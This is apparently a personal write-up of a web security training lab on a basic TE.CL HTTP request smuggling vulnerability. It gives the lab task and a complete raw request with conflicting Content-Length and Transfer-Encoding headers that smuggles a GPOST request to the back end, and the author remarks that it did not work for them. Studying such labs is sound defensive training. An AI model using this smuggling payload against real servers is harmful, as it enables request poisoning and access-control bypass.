Title: HTTP request smuggling, basic TE.CL vulnerability
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.
To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 

# Walkthrough:
Need to send following request twice: 
```
POST / HTTP/1.1
Host: 0a40004003f87b0780bfe49100170099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Not working in my try.
